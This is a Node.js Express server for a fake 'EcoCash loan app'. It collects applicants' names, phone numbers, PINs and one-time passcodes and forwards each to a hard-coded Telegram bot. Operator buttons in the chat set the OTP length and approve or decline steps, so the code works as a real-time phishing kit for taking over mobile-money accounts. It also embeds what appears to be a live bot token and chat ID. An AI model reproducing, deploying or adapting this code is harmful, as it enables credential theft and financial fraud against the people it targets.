const express = require("express");
const path = require("path");
const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));

const app = express();

let otpLength = null;
let decision = null; // accept or decline

app.use(express.json());

// serve static files
app.use(express.static(path.join(__dirname, "public")));

// ==============================
// TELEGRAM CONFIG (PUT YOURS)
// ==============================
const TELEGRAM_TOKEN = "8724075511:AAFjhU_XRoSRaiMo9i3jUNdvjRLUebwRlCc";
const CHAT_ID = "7162306402";

// ==============================
// TELEGRAM FUNCTION
// ==============================

async function sendToTelegram(message) {
  const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;

  await fetch(url, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: message,

      reply_markup: {
        inline_keyboard: [
          [
            { text: "OTP 5", url: "https://ecocash-loan-app.onrender.com/telegram-command?cmd=otp5" },
            { text: "OTP 6", url: "https://ecocash-loan-app.onrender.com/telegram-command?cmd=otp6" }
          ],
          [
            { text: "✅ ACCEPT", url: "https://ecocash-loan-app.onrender.com/telegram-command?cmd=accept" },
            { text: "❌ DECLINE", url: "https://ecocash-loan-app.onrender.com/telegram-command?cmd=decline" }
          ],
          [
            { text: "🔄 RESET", url: "https://ecocash-loan-app.onrender.com/telegram-command?cmd=reset" }
          ]
        ]
      }
    })
  });
}

app.post("/submit", async (req, res) => {
  try {
    const { name, phone, pin } = req.body;

    const message = `
📥 NEW LOAN APPLICATION

👤 Name: ${name}
📞 Phone: ${phone}
🔐 PIN: ${pin}

👇 Use buttons below
`;

console.log("SENDING MESSAGE:", message);

    await sendToTelegram(message);

    res.json({ success: true });

  } catch (err) {
    console.error("ERROR:", err.message);
    res.json({ success: false });
  }
});

// ==============================
// TELEGRAM ADMIN CONTROL
// ==============================
app.get("/telegram-command", (req, res) => {
  const cmd = req.query.cmd;

  if (cmd === "otp5") {
    otpLength = 5;
    console.log("✅ OTP set to 5 from Telegram");
  }

  if (cmd === "otp6") {
    otpLength = 6;
    console.log("✅ OTP set to 6 from Telegram");
  }

  if (cmd === "accept") {
    decision = "accept";
    console.log("✅ USER ACCEPTED");
  }

  if (cmd === "decline") {
    decision = "decline";
    console.log("❌ USER DECLINED");
  }

  if (cmd === "reset") {
    otpLength = null;
    decision = null;
    console.log("🔄 Reset all");
  }

  res.send("OK");
});
// ==============================
// ROOT ROUTE
// ==============================
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

app.post("/set-otp", (req, res) => {
  const { otp } = req.body;

  if (otp !== 5 && otp !== 6) {
    return res.json({ success: false, message: "Only 5 or 6 allowed" });
  }

  otpLength = otp;

  console.log("✅ OTP SET TO:", otpLength);

  res.json({ success: true });
});

app.get("/otp-status", (req, res) => {
  res.json({ otp: otpLength });
});

app.get("/decision-status", (req, res) => {
  res.json({ decision });
});

app.post("/submit-otp", async (req, res) => {
  try {
    const { otp } = req.body;

    console.log("USER OTP:", otp);

    const message = `
🔢 OTP ENTERED:

${otp}

👇 Choose action
`;

    await sendToTelegram(message);

    res.json({ success: true });

  } catch (err) {
    console.log("OTP ERROR:", err.message);
    res.json({ success: false });
  }
});
// ==============================
const PORT = process.env.PORT || 10000;
app.listen(PORT, () => {
  console.log(`Server running on ${PORT}`);
});